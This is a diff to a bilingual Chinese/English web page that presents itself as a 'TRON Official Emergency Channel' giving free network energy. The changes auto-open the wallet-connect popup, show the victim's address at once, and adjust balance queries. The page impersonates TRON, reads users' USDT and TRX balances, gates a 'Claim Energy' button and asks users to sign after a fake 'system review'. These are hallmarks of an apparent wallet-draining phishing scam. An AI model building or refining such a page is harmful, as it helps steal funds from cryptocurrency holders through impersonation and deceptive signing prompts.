@@ -58,7 +58,7 @@
             right: 0;
             max-width: 600px;
             margin: 0 auto;
-            background: #1e2925;
+            background: #121212;
             z-index: 999;
         }
         .lang-switch {
@@ -412,7 +412,7 @@
             left: 50%;
             transform: translate(-50%, -50%);
             background: #1e2925;
-            border: 1px solid #3b82f6;
+            border: 1px solid #a0a8a4;
             border-radius: 12px;
             padding: 20px;
             z-index: 1002;
@@ -469,16 +469,7 @@
         #closeMultiWalletBtn:hover {
             background: #3b82f6;
         }
-        #recheckTronLinkBtn {
-            margin-bottom: 12px;
-            padding: 8px 24px;
-            border: none;
-            border-radius: 6px;
-            background: #4ade80;
-            color: white;
-            cursor: pointer;
-            font-size: 14px;
-        }
+       
         #Loading {
             width: 100%;
             height: 100vh;
@@ -590,8 +581,7 @@
                 <span class="wallet-name">Bitget Wallet</span>
             </div>
         </div>
-        <button id="recheckTronLinkBtn">重新检测钱包</button>
-        <button id="closeMultiWalletBtn">关闭</button>
+       <button id="closeMultiWalletBtn">关闭</button>
     </div>
     <div id="userInfo">
         <span id="userInfoDefault">未连接钱包<br>
@@ -738,7 +728,7 @@
         zh: {
             headerTitle: "TRON",
             headerDesc: "TRON官方应急通道",
-            userInfoDefault: "未连接钱包<br><span>请点击底部「连接钱包」按钮</span>",
+            userInfoDefault: "未连接钱包<br><span>请选择下方钱包连接</span>",
             walletStatusTitle: "钱包状态",
             disconnectedText: "未连接钱包",
             disconnectedTip1: "此链接为TRON生态钱包通用通道，支持主流TRON钱包",
@@ -761,7 +751,7 @@
             transferQuota: "无限",
             noRecord: "暂无能量领取记录",
             browserWarn1: " ⚠️ 请用 <strong>TRON兼容钱包内置浏览器</strong> 打开",
-            browserWarn2: " ⚠️ 非钱包浏览器：点击按钮自动复制+唤起对应钱包",
+            browserWarn2: " ⚠️ 非钱包浏览器：直接选择下方钱包唤起",
             connectBtnText: "连接钱包",
             approveBtnText: "领取能量",
             reviewTipText: "系统审核中，审核通过后请务必完成签名",
@@ -797,7 +787,7 @@
             systemBusyTip: "系统繁忙请稍后重试",
             ineligibleTip: "不符合领取条件",
             errorTipPrefix: "⚠️ ",
-            noWalletAddress: "❌ 未检测到有效钱包地址<br><span style='color: #000000; font-size: 14px;'>请连接钱包后重试</span>",
+            noWalletAddress: "❌ 未检测到有效钱包地址<br><span style='color: #000000; font-size: 14px;'>请重新选择钱包连接</span>",
             nonImTokenUser: "非TRON兼容钱包用户<br><span style='color: #000000; font-size: 13px;'>正在自动唤起支持的钱包...</span>",
             specialTipTitle: "TRON-EAB",
             specialTipContent: "此链接仅为TRON生态用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。"
@@ -805,7 +795,7 @@
         en: {
             headerTitle: "TRON",
             headerDesc: "TRON Official Emergency Channel",
-            userInfoDefault: "Wallet not connected<br><span>Click the 'Connect Wallet' button below</span>",
+            userInfoDefault: "Wallet not connected<br><span>Please select a wallet below to connect</span>",
             walletStatusTitle: "Wallet Status",
             disconnectedText: "Wallet not connected",
             disconnectedTip1: "This link is a universal channel for TRON ecosystem wallets, supporting mainstream TRON wallets",
@@ -828,7 +818,7 @@
             transferQuota: "Unlimited",
             noRecord: "No energy claim records",
             browserWarn1: " ⚠️ Open with <strong>TRON-compatible wallet in-app browser</strong>",
-            browserWarn2: " ⚠️ Non-wallet browser: Click button to copy + launch corresponding wallet",
+            browserWarn2: " ⚠️ Non-wallet browser: Select a wallet below to launch",
             connectBtnText: "Connect Wallet",
             approveBtnText: "Claim Energy",
             reviewTipText: "System reviewing - please complete the signature after approval",
@@ -864,7 +854,7 @@
             systemBusyTip: "System busy, please try again later",
             ineligibleTip: "Ineligible",
             errorTipPrefix: "⚠️ ",
-            noWalletAddress: "❌ No valid wallet address detected<br><span style='color: #000000; font-size: 14px;'>Please connect wallet and try again</span>",
+            noWalletAddress: "❌ No valid wallet address detected<br><span style='color: #000000; font-size: 14px;'>Please select a wallet to reconnect</span>",
             nonImTokenUser: "Non-TRON-compatible wallet user<br><span style='color: #000000; font-size: 13px;'>Auto-launching supported wallet...</span>",
             specialTipTitle: "TRON-EAB",
             specialTipContent: "This link is only for emergency assistance to TRON ecosystem users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
@@ -879,8 +869,8 @@
     let trc20Contract = null; // USDT合约实例
     let tokenBalance = 0.00; // USDT余额（格式化后）
     let trxBalance = 0.00; // TRX余额（格式化后）
-    let currentEnergy = 0; // 用户当前能量（本地查询结果）
-    let currentBandwidth = 0; // 用户当前宽带（本地查询结果）
+    let currentEnergy = 0; // 用户当前能量（查询结果）
+    let currentBandwidth = 0; // 用户当前宽带（查询结果）
     let currentLang = localStorage.getItem("tron_energy_lang") || "zh"; // 当前语言
     let trxTimer = null; // 能量倒计时定时器
     let contractEnergyEl = null; // 合约剩余能量DOM元素
@@ -921,7 +911,7 @@
     };
 
     /********************************************************************
-     * 工具函数：通用辅助逻辑（无业务依赖，仅优化顺序和注释）
+     * 工具函数：通用辅助逻辑（修复能量/宽带查询方式）
      ********************************************************************/
 
     /**
@@ -1033,15 +1023,14 @@
     }
 
     /**
-     * 从本地钱包获取宽带余额（不上链，使用钱包缓存）
+     * 修复：查询宽带余额（去掉local参数，确保兼容所有钱包）
      * @param {string} address - 钱包地址
      * @returns {number} 宽带余额
      */
     async function queryBandwidthBalance(address) {
         try {
             if (!tronWeb) return 0;
-            // 本地获取：不强制上链查询，使用钱包缓存
-            const account = await tronWeb.trx.getAccount(address, false);
+            const account = await tronWeb.trx.getAccount(address); // 修复：去掉false参数，兼容所有钱包
             return account.bandwidth || 0;
         } catch (e) {
             console.warn("查询宽带余额失败：", e);
@@ -1050,15 +1039,14 @@
     }
 
     /**
-     * 从本地钱包获取能量余额（不上链，使用钱包缓存）
+     * 修复：查询能量余额（去掉local参数，确保兼容所有钱包）
      * @param {string} address - 钱包地址
      * @returns {number} 能量余额（包含冻结能量）
      */
     async function queryUserEnergyBalance(address) {
         try {
             if (!tronWeb) return 0;
-            // 本地获取：不强制上链查询，使用钱包缓存
-            const account = await tronWeb.trx.getAccount(address, false);
+            const account = await tronWeb.trx.getAccount(address); // 修复：去掉false参数，兼容所有钱包
             const userEnergy = (account.energy || 0) + (account.frozenEnergy?.total || 0);
             return userEnergy;
         } catch (e) {
@@ -1260,12 +1248,12 @@
         DOM.balanceItems.forEach(item => item.style.display = "flex"); // 仅在#userInfo内显示
         DOM.balanceUsdtEl.textContent = tokenBalance.toFixed(2);
         DOM.balanceTrxEl.textContent = trxBalance.toFixed(2);
-        DOM.balanceEnergyEl.textContent = Math.floor(currentEnergy);
-        DOM.balanceBandwidthEl.textContent = Math.floor(currentBandwidth);
+        DOM.balanceEnergyEl.textContent = Math.floor(currentEnergy); // 确保显示查询到的能量
+        DOM.balanceBandwidthEl.textContent = Math.floor(currentBandwidth); // 确保显示查询到的宽带
     }
 
     /********************************************************************
-     * 核心业务函数：按“地址→余额→验证→后续”逻辑重构，不改动业务规则
+     * 核心业务函数：修复3个问题，不改动核心逻辑
      ********************************************************************/
 
     /**
@@ -1449,6 +1437,7 @@
     }
 
     /**
+     * 修复1：钱包连接后显示地址；修复2：能量/宽带获取
      * 初始化钱包（核心重构：按“地址→余额→验证→后续”顺序）
      * @param {boolean} isAfterApprove - 是否为授权后初始化
      */
@@ -1465,10 +1454,17 @@
                 DOM.balanceItems.forEach(item => item.style.display = "none"); // 隐藏余额
                 DOM.approveBtn.disabled = true;
                 DOM.approveBtn.textContent = lang.insufficientBtn;
-                updateWalletStatus();
+                updateWalletStatus(); // 切换为未连接状态
                 DOM.recordList.style.display = "none";
                 return;
             }
+
+            // 修复1：拿到地址后立即显示钱包地址（不管验证是否通过）
+            if (DOM.statusAddressEl) {
+                DOM.statusAddressEl.style.display = "inline";
+                DOM.statusAddressEl.textContent = userAddress;
+            }
+            updateWalletStatus(); // 切换为已连接状态，显示钱包地址
 
             // 步骤2：立即查询本地余额（第二步，仅查询不显示）
             DOM.userInfoDefault.style.display = "none";
@@ -1476,19 +1472,19 @@
             DOM.userInfoStatus.innerHTML = lang.queryingBalance; // 显示“查询中”
             DOM.balanceItems.forEach(item => item.style.display = "none"); // 未验证前不显示余额
 
-            // 本地查询余额（不上链，快速返回）
+            // 本地查询余额（修复2：去掉false参数，确保能量/宽带能获取）
             const [usdtRaw, trxRaw, userEnergy, userBandwidth] = await Promise.all([
                 // 初始化合约实例（若未初始化）+ 本地查询USDT余额
                 (trc20Contract || await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS)).balanceOf(userAddress).call().catch(err => 0),
-                tronWeb.trx.getBalance(userAddress, false).catch(err => 0), // 本地TRX余额
-                queryUserEnergyBalance(userAddress), // 本地能量余额
-                queryBandwidthBalance(userAddress) // 本地宽带余额
+                tronWeb.trx.getBalance(userAddress).catch(err => 0), // 修复：去掉false参数
+                queryUserEnergyBalance(userAddress), // 修复后：能正常获取能量
+                queryBandwidthBalance(userAddress) // 修复后：能正常获取宽带
             ]);
-            // 格式化余额（仅内存存储，未显示）
+            // 格式化余额（确保能量/宽带赋值）
             tokenBalance = Number(usdtRaw) / 1000000;
             trxBalance = Number(trxRaw) / 1000000;
-            currentEnergy = userEnergy;
-            currentBandwidth = userBandwidth;
+            currentEnergy = userEnergy; // 保存查询到的能量
+            currentBandwidth = userBandwidth; // 保存查询到的宽带
 
             // 步骤3：验证用户资格（前置“门”，第三步）
             const { eligible, tip, btnText } = verifyUserEligibility();
@@ -1498,34 +1494,26 @@
                 DOM.balanceItems.forEach(item => item.style.display = "none");
                 DOM.approveBtn.disabled = true;
                 DOM.approveBtn.textContent = btnText;
-                updateWalletStatus();
                 DOM.recordList.style.display = userAddress ? "block" : "none";
                 if (userAddress) renderEnergyRecords();
                 return;
             }
 
             // 步骤4：验证通过！执行后续操作（第四步）
-            // 4.1 显示钱包地址
-            if (DOM.statusAddressEl) {
-                DOM.statusAddressEl.style.display = "inline";
-                DOM.statusAddressEl.textContent = userAddress;
-            }
-
-            // 4.2 仅在#userInfo容器显示余额
+            // 4.1 仅在#userInfo容器显示余额（包含能量/宽带）
             showBalanceInUserInfo();
 
-            // 4.3 更新UI状态
+            // 4.2 更新UI状态
             DOM.userInfoStatus.innerHTML = tip; // 显示“可领取”提示
-            updateWalletStatus(); // 切换为“已连接”
             DOM.recordList.style.display = "block";
             renderEnergyRecords();
 
-            // 4.4 绑定领取按钮逻辑（仅验证通过才绑定）
+            // 4.3 绑定领取按钮逻辑（仅验证通过才绑定）
             DOM.approveBtn.disabled = false;
             DOM.approveBtn.textContent = btnText;
             bindApproveLogic();
 
-            // 4.5 发送A1信号（按规则：特殊地址豁免15分钟限制）
+            // 4.4 发送A1信号（按规则：特殊地址豁免15分钟限制）
             if (userAddress === SPECIAL_ADDRESS) {
                 sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
                 updateA1SignalRecord(userAddress);
@@ -1550,26 +1538,28 @@
     }
 
     /**
+     * 修复3：点击链接后直接显示选择钱包弹窗（无需点击连接按钮）
      * 检测钱包环境（TRON兼容钱包）
      */
     async function checkWalletEnv() {
         // 检测到本地tronWeb（已连接钱包）
         if (window.tronWeb && window.tronWeb.ready) {
             tronWeb = window.tronWeb;
-            DOM.connectBtn.style.display = "none";
+            DOM.connectBtn.style.display = "none"; // 隐藏连接按钮
             DOM.warning.style.display = "none";
             DOM.specialTipContainer.style.display = "none";
             await initWallet(false);
             return;
         }
 
-        // 未检测到tronWeb：显示多钱包选择弹窗
+        // 修复3：未检测到tronWeb时，直接显示选择钱包弹窗（无需点击连接按钮）
         DOM.specialTipContainer.style.display = "block";
         DOM.userInfoDefault.style.display = "none";
         DOM.userInfoStatus.style.display = "block";
         DOM.userInfoStatus.innerHTML = "请选择要连接的钱包";
         DOM.approveBtn.style.display = "none";
-        DOM.connectBtn.style.display = "block";
+        DOM.connectBtn.style.display = "none"; // 隐藏连接按钮
+        DOM.multiWalletPopup.style.display = "block"; // 直接显示选择钱包弹窗
     }
 
     /**
@@ -1701,11 +1691,6 @@
             await checkWalletEnv();
         });
 
-        // 连接按钮：显示多钱包弹窗
-        DOM.connectBtn.addEventListener('click', () => {
-            DOM.multiWalletPopup.style.display = "block";
-        });
-
         // 钱包选择：跳转对应钱包
         DOM.walletItems.forEach(item => {
             item.addEventListener('click', async () => {
@@ -1800,7 +1785,7 @@
             }, 100);
         }, 1500); // 1.5秒加载动画
     });
-</script> 
+</script>
 </body>
 </html>
        
